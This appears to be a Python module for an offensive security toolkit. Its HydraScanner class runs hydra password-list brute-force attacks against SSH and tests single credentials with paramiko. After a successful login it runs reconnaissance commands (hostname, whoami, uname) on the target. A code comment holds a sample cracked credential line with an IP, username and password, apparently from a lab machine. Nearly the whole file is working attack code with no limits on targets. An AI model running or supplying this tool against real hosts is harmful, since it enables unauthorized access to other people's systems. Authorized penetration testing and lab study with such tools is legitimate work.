import asyncio
from typing import Dict, List, Optional
import re
import paramiko
import socket

class HydraScanner:
    """hydraを使用してブルートフォース攻撃を実行するスキャナー"""

    def __init__(self):
        # タイムアウトや並列実行数などのデフォルト設定
        self.timeout = 30
        self.tasks = 4

    async def ssh_login_test(self, target: str, username: str, password: str, port: int = 22) -> str:
        """指定のIDとPasswordを使用してSSHログインを試します。"""
        
        try:
            # SSHクライアントを作成
            ssh_client = paramiko.SSHClient()
            ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            # 接続タイムアウトを設定
            ssh_client.connect(
                hostname=target,
                port=port,
                username=username,
                password=password,
                timeout=self.timeout,
                banner_timeout=self.timeout,
                auth_timeout=self.timeout
            )
            
            # 接続が成功した場合、基本的な情報を取得
            try:
                # ホスト名を取得
                stdin, stdout, stderr = ssh_client.exec_command('hostname', timeout=10)
                hostname = stdout.read().decode('utf-8').strip()
                
                # 現在のユーザーを取得
                stdin, stdout, stderr = ssh_client.exec_command('whoami', timeout=10)
                current_user = stdout.read().decode('utf-8').strip()
                
                # システム情報を取得
                stdin, stdout, stderr = ssh_client.exec_command('uname -a', timeout=10)
                system_info = stdout.read().decode('utf-8').strip()
                
                ssh_client.close()
                
                return f"""✅ SUCCESS: SSH login successful!

🔐 Login Details:
  - Host: {target}:{port}
  - Username: {username}
  - Password: {password}

📋 System Information:
  - Hostname: {hostname}
  - Current User: {current_user}
  - System: {system_info}

💡 The credentials are valid and you can now execute commands on the target system."""
                
            except Exception as e:
                ssh_client.close()
                return f"""✅ SUCCESS: SSH login successful!

🔐 Login Details:
  - Host: {target}:{port}
  - Username: {username}
  - Password: {password}

⚠️ Note: Login successful but could not retrieve system information.
Error: {str(e)}"""
                
        except paramiko.AuthenticationException:
            return f"""❌ FAILED: Authentication failed

🔐 Login Attempt:
  - Host: {target}:{port}
  - Username: {username}
  - Password: {password}

💡 The username or password is incorrect."""
            
        except paramiko.SSHException as e:
            return f"""❌ FAILED: SSH connection error

🔐 Login Attempt:
  - Host: {target}:{port}
  - Username: {username}
  - Password: {password}

🔧 Error: {str(e)}"""
            
        except socket.timeout:
            return f"""❌ FAILED: Connection timeout

🔐 Login Attempt:
  - Host: {target}:{port}
  - Username: {username}
  - Password: {password}

⏱️ The connection timed out after {self.timeout} seconds."""
            
        except socket.gaierror:
            return f"""❌ FAILED: Host not found

🔐 Login Attempt:
  - Host: {target}:{port}
  - Username: {username}
  - Password: {password}

🌐 The host '{target}' could not be resolved."""
            
        except Exception as e:
            return f"""❌ FAILED: Unexpected error

🔐 Login Attempt:
  - Host: {target}:{port}
  - Username: {username}
  - Password: {password}

🚨 Error: {str(e)}"""

    async def ssh_brute_force(self, target: str, port: int, username: str, password_list_path: str) -> str:
        """SSHに対してパスワードリスト攻撃を実行します。"""

        # hydraコマンドを安全なリスト形式で構築
        cmd_parts = [
            "hydra",
            "-t", str(self.tasks),
            "-W", str(self.timeout),
            "-l", username,
            "-P", password_list_path,
            f"ssh://{target}:{port}"
        ]

        # サブプロセスとしてhydraコマンドを実行
        process = await asyncio.create_subprocess_exec(
            *cmd_parts,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )

        stdout, stderr = await process.communicate()
        
        output = stdout.decode('utf-8', errors='ignore').strip()
        error_output = stderr.decode('utf-8', errors='ignore').strip()

        # hydraの出力を解析してパスワードを見つける
        # 例: [22][ssh] host: 10.10.13.152   login: lin   password: RedDr@gonSyn9ic47e
        password_pattern = re.compile(r'password:\s*(.*)')
        found_password = None
        
        for line in output.splitlines():
            if "host:" in line and "login:" in line and "password:" in line:
                match = password_pattern.search(line)
                if match:
                    found_password = match.group(1).strip()
                    break
        
        if found_password:
            return f"✅ SUCCESS: Password found!\n  - Host: {target}\n  - Port: {port}\n  - User: {username}\n  - Password: {found_password}"
        elif process.returncode != 0:
            return f"❌ FAILED: hydra command failed.\nError: {error_output or output}"
        else:
            return "❌ FAILED: Password not found in the provided list."

    async def get_status(self) -> str:
        """Hydra Scannerの状態確認"""
        # hydraがインストールされているか簡単なチェック
        process = await asyncio.create_subprocess_shell("hydra -h", stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
        await process.communicate()
        if process.returncode == 0:
            return "Available"
        else:
            return "Not available (hydra command not found)"